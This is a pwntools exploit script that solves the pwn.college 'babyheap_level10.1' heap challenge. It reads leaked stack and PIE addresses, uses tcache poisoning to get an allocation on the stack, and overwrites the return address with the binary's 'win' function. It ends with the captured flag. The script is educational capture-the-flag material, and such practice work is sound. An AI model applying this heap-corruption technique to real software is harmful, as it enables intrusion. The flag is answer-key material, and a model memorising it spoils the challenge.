from pwn import *

def _malloc(index, size):
    io.sendlineafter(b"[*] Function (malloc/free/puts/scanf/quit): ", b"malloc")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendlineafter(b"Size: ", str(size).encode())

def _free(index):
    io.sendlineafter(b"[*] Function (malloc/free/puts/scanf/quit): ", b"free")
    io.sendlineafter(b"Index: ", str(index).encode())

def _scanf(index, data):
    io.sendlineafter(b"[*] Function (malloc/free/puts/scanf/quit): ", b"scanf")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendline(data)

def _quit():
    io.sendlineafter(b"[*] Function (malloc/free/puts/scanf/quit): ", b"quit")

elf = ELF("./babyheap_level10.1")
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
io = s.process("/challenge/babyheap_level10.1")

io.recvuntil(b"at: "); stack = int(io.recvline()[:-2],16)
info("Leak stack: " + hex(stack))
 
io.recvuntil(b"at: "); main = int(io.recvline()[:-2],16)
elf.address = main - elf.sym['main']
info("Leak pie: " + hex(elf.address))

_malloc(0, 128); _malloc(1, 128)
_free(1); _free(0)

_scanf(0, p64(stack + 0x118))
_malloc(2, 128); _malloc(3, 128)

_scanf(3, p64(elf.sym['win']))
_quit()

io.interactive()
# Flag: pwn.college{wzs4PbmORSUEmKT0CQ0K6k4FN-Y.0FM5MDLxIjNyEzW}